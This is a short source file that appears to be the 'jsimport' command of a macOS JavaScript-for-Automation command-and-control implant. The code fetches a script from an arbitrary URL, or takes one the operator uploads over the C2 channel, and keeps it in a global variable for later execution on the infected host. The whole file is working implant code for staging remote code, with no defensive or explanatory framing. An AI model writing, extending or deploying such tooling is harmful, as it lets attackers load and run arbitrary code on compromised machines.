exports.jsimport = function(task,command,params){
    let script = "";
    try{
        let config = JSON.parse(params);
        if(config.hasOwnProperty("url") && config['url'] !== ""){
            script = ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(config['url'])),$.NSUTF8StringEncoding));
            if(script === ""){
                return JSON.stringify({"user_output":"Failed to pull down code, got empty string", "completed": true, "status": "error"});
            }
        }
        else if(config.hasOwnProperty("file_id")){
            let script_data = C2.upload(task, config['file_id']);
            if(typeof script_data === "string"){
                return JSON.stringify({"user_output":"Failed to get contents of file", "completed": true, "status": "error"});
            }
            script = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(script_data, $.NSUTF8StringEncoding));
        }
        else{
            return JSON.stringify({"user_output":"Need to supply a valid URL or a valid file ID", "completed": true, "status": "error"});
        }
        jsimport = script;
        return JSON.stringify({"user_output":"Imported the script", "completed": true});
    }
    catch(error){
        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
    }
};
COMMAND_ENDS_HERE